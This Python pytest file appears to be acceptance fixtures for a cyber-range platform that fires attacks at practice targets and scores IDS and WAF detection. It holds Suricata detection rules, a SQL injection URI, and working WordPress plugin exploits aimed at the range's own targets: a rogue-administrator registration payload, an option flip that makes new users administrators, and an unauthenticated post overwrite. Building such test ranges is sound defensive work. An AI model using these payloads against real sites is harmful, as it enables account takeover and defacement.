import json
import os
import re
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode

import pytest

import plays
from conftest import STANDING, TARGET_PUBLIC, from_attacker, runs_the_declared_rules
from range import ATTACKER, BOARD, log_collector, missing, platform_addresses, run, run_side_by_side

CONTROL = "board-sqli-search"
SECOND_SHAPE = "board-sqli-union-search"
UNION = "board-sqli-union-search"
WAF = "waf"
BENIGN_SEARCH = "board-normal-search"
SQLMAP = "board-sqli-orderby-sqlmap"
LAST_ATTACK = "board-path-traversal-static"
EVERY_SQLMAP_VARIANT = os.environ.get("CR_SQLMAP_VARIANTS") == "1"

NOISY_RULE = (
    '\nalert http any any -> any any (msg:"deliberate false positive"; '
    'http.uri; content:"release"; nocase; sid:9009999; rev:1;)\n'
)
BUFFERLESS = (
    'alert http any any -> any any (msg:"UNION without a buffer"; '
    'flow:established,to_server; content:"UNION"; nocase; sid:9009996; rev:1;)\n'
)
PORTED_RULE = 'alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"ported SQLi probe"; flow:established,to_server; http.uri; pcre:"/(\\x27[\\s+]*(or|and)[\\s+]*[\\x27\\d]|union[\\s+]+select|--[\\s+]|\\x27[\\s+]*--|\\x27[\\s+]*\\x29)/i"; sid:9009995; rev:1;)\n'
NOT_A_RULE = "this is not a rule"
CATCH_ALL_MESSAGE = "SQL XSS traversal Restricted File"
CATCH_ALL = (
    f'alert http any any -> any any (msg:"{CATCH_ALL_MESSAGE}"; '
    'flow:established,to_server; http.uri; content:"/"; sid:9009997; rev:1;)\n'
)
GENERIC_PROBE = (
    'alert http any any -> any any (msg:"generic probe"; '
    'flow:established,to_server; http.uri; content:"1=1"; sid:9009994; rev:1;)\n'
)
PORTED_MESSAGE = "ported SQLi probe"
CATCH_ALL_SETUP = plays.Setup(wargame="board", title="Acceptance catch-all rules board", suricata_rules=CATCH_ALL)
NOISY_WAIT = 6 * plays.BENIGN_EVERY_S + 120.0
CATCH_ALL_ATTACKS = ("board-sqli-search", "board-xss-script-tag-in-search", "board-path-traversal-static")
CATCH_ALL_BENIGN = ("board-normal-search", "board-normal-search-with-apostrophe")

SHELL_ATTACK = "/search/?q=%27%20OR%201%3D1--%20{token}"
WINDOW_GAP_SECONDS = 6

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "corp.com"
FORM = {"Content-Type": "application/x-www-form-urlencoded"}
ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
REGISTER_NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
AJAX_NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')
SUBMISSION_NONCE = re.compile(r'rbGlobalSubmissionSettings = {"nonce":"([a-f0-9]+)"')
DEFACED = {
    "post_title": "Defaced by an unauthenticated guest",
    "post_excerpt": "overwritten without owning this post",
    "post_content": "overwritten without owning this post via rbsm_submit_post postId overwrite",
}
POST_FIELDS = ("post_title", "post_content", "post_excerpt", "post_status")
EFFECT_WAIT = 180.0


def red_team_cases() -> list[str]:
    declared = [case for case in plays.declared_cases("board") if case.get("malicious") is True]
    return [case["name"] for case in declared
            if EVERY_SQLMAP_VARIANT or not case.get("tool") or case["name"] == SQLMAP]


def benign_names(wargame: str = "board") -> set[str]:
    return {case["name"] for case in plays.declared_cases(wargame) if case.get("malicious") is False}


def auth_users_of(allocation: int) -> dict:
    body = run(BOARD, [
        "python3", "-c",
        "import urllib.request,sys; "
        "sys.stdout.write(urllib.request.urlopen("
        "'http://127.0.0.1:8000/internal/auth-users', timeout=20).read().decode())",
    ], allocation=allocation).stdout
    return json.loads(body)


def loot_of(truth: dict) -> list[dict]:
    return [{"username": name, "hash": digest} for name, digest in truth.items()]


def one_digest_changed(truth: dict) -> list[dict]:
    forged = loot_of(truth)[:1]
    digest = forged[0]["hash"]
    forged[0]["hash"] = digest[:-1] + ("A" if digest[-1] != "A" else "B")
    return forged


def probed(played: plays.Played, token: str) -> list[dict]:
    from_attacker(SHELL_ATTACK.format(token=token), allocation=played.allocation)
    return plays.alerts_until(played, lambda listed: bool(with_token(listed, token)))


def with_token(listed: list[dict], token: str) -> list[dict]:
    return [alert for alert in listed if token in (alert.get("uri") or "")]


def typed(command: str, allocation: int):
    shell = f"printf '{command}\\nexit\\n' | bash -i"
    return run(ATTACKER, ["bash", "-c", shell], timeout=120, allocation=allocation)


@pytest.fixture(scope="session")
def full_run(stack_is_up):
    STANDING.release()
    with plays.Round("board") as played:
        markers = {name: plays.fired(played, name)["marker"] for name in red_team_cases()}
        benign = benign_names()

        def ready(scored):
            listed = plays.alerts(played)
            return (plays.totals(scored)["tp"] > 0 and "waf" in {alert["engine"] for alert in listed}
                    and bool(plays.marked(listed, markers[CONTROL]))
                    and bool(plays.marked(listed, markers[LAST_ATTACK]))
                    and "ids" in plays.engines(listed, markers[UNION])
                    and bool(benign & set(plays.per_case(scored))))

        scored = plays.score_when_ready(played, until=ready)
        return {
            "own_sources": {"127.0.0.1", "::1", *platform_addresses(log_collector(played.allocation)),
                            *run(WAF, ["hostname", "-I"], allocation=played.allocation).stdout.split()},
            "round": played.round,
            "score": scored,
            "markers": markers,
            "alerts": plays.alerts(played),
            "cases": plays.cases_listed(played),
            "declared": plays.declared_cases("board"),
            "topology": plays.topology(played),
            "scored_by": {strategy: plays.score(played, strategy).body for strategy in ("marker", "window")},
        }


@pytest.fixture(scope="session")
def score(full_run):
    return full_run["score"]


@pytest.fixture(scope="session")
def board_round(stack_is_up):
    with plays.Round("board") as played:
        seen = {"round": played.round}
        seen["objectives_at_start"] = plays.attack_seen(played)["objectives"]
        seen["score_while_running"] = plays.score(played, client=played.attack)
        seen["marker"] = plays.fired(played, CONTROL)["marker"]
        seen["control_alerts"] = plays.marked(
            plays.alerts_until(played, lambda listed: bool(plays.marked(listed, seen["marker"]))), seen["marker"])
        seen["response"] = plays.tune_waf(played, plays.appended(played, plays.CRS_EXCLUSIONS, plays.BOT_SEARCH_RULE))
        truth = auth_users_of(played.allocation)
        seen["truth"] = truth
        seen["fabricated_loot"] = plays.loot(played, one_digest_changed(truth))
        seen["objectives_after_fabricated"] = plays.attack_seen(played)["objectives"]
        seen["real_loot"] = plays.loot(played, loot_of(truth))
        seen["ended"] = plays.end(played)
        seen["score_once_ended"] = plays.score(played, client=played.attack)
        seen["scored"] = plays.score_when_ready(played, until=lambda scored: bool(scored["objectives"]["lost"]))
    with plays.Round("board") as fresh:
        seen["stale_loot"] = plays.loot(fresh, loot_of(truth))
        seen["objectives_after_stale"] = plays.attack_seen(fresh)["objectives"]
    return seen


@pytest.fixture(scope="session")
def origins_round(stack_is_up):
    with plays.Round("board") as played:
        state = plays.attack_seen(played)
        seen = {"origins": state["origins"], "first": state["remaining"]["origin"]}
        seen["front"] = plays.fired(played, CONTROL)["marker"]
        moved = plays.next_origin(played)
        seen["elsewhere"] = moved["origin"]
        seen["moved"] = plays.fired(played, SECOND_SHAPE)["marker"] if moved["origin"] else None
        wanted = [marker for marker in (seen["front"], seen["moved"]) if marker]
        seen["alerts"] = plays.alerts_until(
            played, lambda listed: all(plays.marked(listed, marker) for marker in wanted))
        tool = plays.fire(played, SQLMAP)
        seen["tool"] = tool
        seen["tool_run"] = plays.finished_run(played, tool.body["run"]) if tool.status == 202 else None
        seen["tools"] = plays.tools_listed(played)
        seen["unknown_tool"] = plays.start_tool(played, "not-a-tool", [])
    return seen


@pytest.fixture(scope="session")
def rules_round(stack_is_up):
    seen = {}
    with plays.Round("board") as played:
        baseline = runs_the_declared_rules(played)
        seen["rules_before_invalid"] = plays.ids_rules(played)["text"]
        seen["invalid"] = plays.apply_ids(played, NOT_A_RULE)
        seen["rules_after_invalid"] = plays.ids_rules(played)["text"]

        applied = plays.apply_ids(played, BUFFERLESS)
        assert applied.ok, applied.text
        union = plays.fired(played, UNION)["marker"]

        def bufferless_caught(listed):
            return any(alert["signature"].startswith("UNION without a buffer") for alert in plays.marked(listed, union))

        listed = plays.alerts_until(played, bufferless_caught)
        seen["bufferless"] = (plays.score_when_ready(played, until=lambda scored: UNION in plays.per_case(scored)),
                              union, listed)

    noisy_rules = baseline + PORTED_RULE + NOISY_RULE
    with plays.Round("board", plays.Setup(wargame="board", title="Acceptance noisy rules board",
                                          suricata_rules=noisy_rules)) as played:
        seen["noisy_rules"] = (plays.ids_rules(played)["text"], noisy_rules)
        noisy_markers = {name: plays.fired(played, name)["marker"] for name in (CONTROL, UNION)}
        seen["noisy_markers"] = noisy_markers

        def ported_caught(listed):
            return any(alert["signature"] == PORTED_MESSAGE
                       for marker in noisy_markers.values() for alert in plays.marked(listed, marker))

        plays.alerts_until(played, ported_caught)
        seen["after_noisy"] = plays.score_when_ready(
            played, until=lambda scored: plays.per_case(scored).get(BENIGN_SEARCH, {}).get("verdict") == "fp",
            timeout=NOISY_WAIT)
        seen["noisy_alerts"] = plays.alerts(played)
        seen["noisy_origins"] = {origin["ip"] for origin in plays.attack_seen(played)["origins"]}
        seen["attacker_processes"] = run(ATTACKER, ["ps", "-eo", "user=,args="], allocation=played.allocation).stdout

    with plays.Round("board", CATCH_ALL_SETUP) as played:
        engine_off = plays.tune_waf(played, plays.appended(played, plays.CRS_SETUP, plays.RULE_ENGINE_OFF))
        assert engine_off.ok, engine_off.text
        seen["catch_all_markers"] = {name: plays.fired(played, name)["marker"] for name in CATCH_ALL_ATTACKS}

        def caught_both_ways(scored):
            verdicts = {case: line["verdict"] for case, line in plays.per_case(scored).items()}
            return (all(verdicts.get(name) == "tp" for name in CATCH_ALL_ATTACKS)
                    and "fp" in {verdicts.get(name) for name in CATCH_ALL_BENIGN})

        seen["after_catch_all"] = plays.score_when_ready(played, until=caught_both_ways, timeout=NOISY_WAIT)
        seen["catch_all_alerts"] = plays.alerts(played)

        plays.replay(played)
        engine_off = plays.tune_waf(played, plays.appended(played, plays.CRS_SETUP, plays.RULE_ENGINE_OFF))
        assert engine_off.ok, engine_off.text
        generic = plays.apply_ids(played, GENERIC_PROBE)
        assert generic.ok, generic.text
        plays.fired(played, CONTROL)

        def generic_judged(scored):
            lines = plays.per_case(scored)
            return (lines.get(CONTROL, {}).get("verdict") == "tp"
                    and any(name in lines for name in CATCH_ALL_BENIGN))

        seen["after_generic"] = plays.score_when_ready(played, until=generic_judged, timeout=NOISY_WAIT)
    return seen


@pytest.fixture(scope="session")
def terminal_round(stack_is_up):
    with plays.Round("board") as played:
        state = plays.attack_seen(played)
        seen = {"round": played.round, "origin": state["remaining"]["origin"]}
        seen["box_addresses"] = run(ATTACKER, ["sh", "-c", "hostname -I"], allocation=played.allocation).stdout.split()
        token = f"zz{uuid.uuid4().hex[:10]}"
        seen["front"] = (token, with_token(probed(played, token), token))

        typed("nmap --version", played.allocation)
        typed("echo after", played.allocation)
        deadline = time.monotonic() + plays.SCORE_WAIT
        while True:
            run_lines = [event["body"].get("command") for event in plays.events(played, {"command.run"})]
            if {"nmap --version", "echo after"} <= set(run_lines) or time.monotonic() >= deadline:
                break
            time.sleep(plays.POLL)
        seen["commands"] = run_lines

        moved = plays.next_origin(played)
        seen["elsewhere"] = moved["origin"]
        if moved["origin"]:
            token = f"zz{uuid.uuid4().hex[:10]}"
            seen["moved"] = (token, with_token(probed(played, token), token))
    return seen


@pytest.fixture(scope="session")
def terminal_windows(stack_is_up):
    with plays.Round("board") as played:
        seen = {"origin": plays.attack_seen(played)["remaining"]["origin"]}
        time.sleep(WINDOW_GAP_SECONDS)
        token = f"zz{uuid.uuid4().hex[:10]}"
        started = plays.start_tool(played, "whatweb", [f"{TARGET_PUBLIC}{SHELL_ATTACK.format(token=token)}"])
        assert started.status == 202, started.text
        plays.finished_run(played, started.body["run"])
        seen["window_token"] = token
        time.sleep(WINDOW_GAP_SECONDS)
        seen["control"] = plays.fired(played, CONTROL)["marker"]

        def ready(scored):
            free = {row["ip"]: row for row in scored["free_actions"]["by_origin"]}
            line = plays.per_case(scored).get(CONTROL, {})
            return line.get("verdict") == "tp" and free.get(seen["origin"]["ip"], {}).get("alerts", 0) > 0

        seen["score"] = plays.score_when_ready(played, until=ready)
        seen["by"] = {strategy: plays.score(played, strategy).body for strategy in ("marker", "window")}
        seen["alerts"] = plays.alerts(played)
    return seen


def verdicts_of(scored: dict) -> dict[str, str]:
    return {case: line["verdict"] for case, line in plays.per_case(scored).items()}


def wordpress_db(sql):
    return ["mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e", sql]


ADMINS = wordpress_db(
    "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
    "AND meta_value LIKE '%administrator%';"
)
FIRST_POST = wordpress_db(
    f"SELECT ID,{','.join(POST_FIELDS)} FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;"
)


def option_query(name):
    return wordpress_db(f"SELECT option_value FROM wp_options WHERE option_name='{name}';")


def post_query(post_id):
    return wordpress_db(f"SELECT {','.join(POST_FIELDS)} FROM wp_posts WHERE ID={post_id};")


def ids_in(out):
    return {int(x) for x in out.split()}


def first_post_in(out):
    post_id, *fields = out.rstrip("\n").split("\t", len(POST_FIELDS))
    return {"ID": post_id, **dict(zip(POST_FIELDS, fields))}


def post_in(out):
    return dict(zip(POST_FIELDS, out.rstrip("\n").split("\t", len(POST_FIELDS) - 1)))


def admin_ids(allocation):
    return ids_in(run(CORP_DB, ADMINS, allocation=allocation).stdout)


def post_row(post_id, allocation):
    return post_in(run(CORP_DB, post_query(post_id), allocation=allocation).stdout)


def nonce_from(played: plays.Played, page: str, pattern: re.Pattern) -> str:
    fetched = plays.send(played, "GET", page, host=CORP_HOST)
    assert fetched.ok, fetched.text
    found = pattern.search(fetched.body["body"])
    assert found or not fetched.body["truncated"], (
        f"{page} came back cut at the attack API's body limit before its nonce; the exploit needs the whole page")
    return found.group(1) if found else ""


def posted(played: plays.Played, path: str, form: str, query: dict | None = None) -> plays.Answer:
    return plays.send(played, "POST", path, host=CORP_HOST, headers=FORM, body=form, query=query or {})


def registration(login: str, nonce: str) -> str:
    return urlencode({
        "form_id": "5", "um_request": "", "_wpnonce": nonce, "_wp_http_referer": "/register/",
        "user_login-5": login, "first_name-5": "North", "last_name-5": "Wind",
        "user_email-5": f"{login}@example.com", "user_password-5": "Str0ng-Pass-9271",
        "confirm_user_password-5": "Str0ng-Pass-9271",
    }) + "&" + ROGUE_KEY


def option_flip(name: str, value: str) -> str:
    return urlencode({"data": f'{{"type":"save_setting","append":false,"option":"{name}","value":"{value}"}}'})


def post_overwrite(post_id: str, nonce: str) -> str:
    return urlencode({
        "action": "rbsm_submit_post", "_nonce": nonce, "formId": "1", "postId": post_id,
        "title": DEFACED["post_title"], "excerpt": DEFACED["post_excerpt"], "content": DEFACED["post_content"],
        "userName": "Anonymous Contributor", "userEmail": "anon@example.com",
    })


def corp_is_declared():
    absent = missing(CORP, CORP_DB)
    assert not absent, (
        f"the corp wargame is not on this range: "
        f"{', '.join(absent)} {'has' if len(absent) == 1 else 'have'} no host "
        f"in platform/sandbox/declaration.yaml for it, so nothing builds or boots "
        f"the target and the live exploit has nothing to change"
    )


def lost_keys(played: plays.Played, wanted: set[str]) -> set[str]:
    deadline = time.monotonic() + EFFECT_WAIT
    while True:
        lost = {line["key"] for line in plays.defence_seen(played)["objectives"] if line["state"] == "lost"}
        if wanted <= lost or time.monotonic() >= deadline:
            return lost
        time.sleep(plays.POLL)


def rogue_admin_run():
    with plays.Round(CORP) as played:
        before = run_side_by_side(CORP_DB, {"admins": ADMINS, "post": FIRST_POST}, allocation=played.allocation)
        baseline, original = ids_in(before["admins"].stdout), first_post_in(before["post"].stdout)
        seen = {"round": played.round, "baseline": baseline, "original": original}
        nonce = nonce_from(played, "/register/", REGISTER_NONCE)
        assert nonce, "no _wpnonce on the live UM register form; is corp-wp up?"
        seen["registered"] = posted(played, "/register/", registration(f"rogue_{uuid.uuid4().hex[:8]}", nonce))
        seen["admins"] = admin_ids(played.allocation)
        seen["created"] = seen["admins"] - baseline
        nonce = nonce_from(played, "/submit-a-story/", SUBMISSION_NONCE)
        assert nonce, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
        seen["overwrite"] = posted(played, "/wp-admin/admin-ajax.php", post_overwrite(original["ID"], nonce))
        seen["overwritten"] = post_row(original["ID"], played.allocation)
        seen["lost"] = lost_keys(played, {"corp-rogue-admin", "corp-content-overwrite"})
        plays.end(played)
        seen["score"] = plays.score(played).body
    return seen


def option_flip_run():
    with plays.Round(CORP) as played:
        seen = {"round": played.round}
        nonce = nonce_from(played, "/", AJAX_NONCE)
        assert nonce, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
        flipping = {"action": "wpgdprc_process_action", "security": nonce}
        flipped = [posted(played, "/wp-admin/admin-ajax.php", option_flip(name, value), flipping).body
                   for name, value in (("users_can_register", "1"), ("default_role", "administrator"))]
        seen["flips"] = tuple(answer["status"] for answer in flipped)
        seen["flip_markers"] = {answer["marker"] for answer in flipped}
        read = run_side_by_side(CORP_DB, {name: option_query(name) for name in ("users_can_register", "default_role")},
                                allocation=played.allocation)
        seen["registration_open"] = read["users_can_register"].stdout.strip()
        seen["default_role"] = read["default_role"].stdout.strip()
        seen["lost"] = lost_keys(played, {"corp-self-registration"})
        plays.end(played)
        seen["score"] = plays.score(played).body
    return seen


def finished(*calls):
    with ThreadPoolExecutor(max_workers=len(calls)) as pool:
        return [pool.submit(call) for call in calls]


@pytest.fixture(scope="session")
def corp_rounds(stack_is_up):
    corp_is_declared()
    rogue_admin, option_flip_seen = finished(rogue_admin_run, option_flip_run)
    return {"rogue_admin": rogue_admin.result(), "option_flip": option_flip_seen.result()}


@pytest.fixture(scope="session")
def rogue_admin_round(corp_rounds):
    return corp_rounds["rogue_admin"]


@pytest.fixture(scope="session")
def option_flip_round(corp_rounds):
    return corp_rounds["option_flip"]
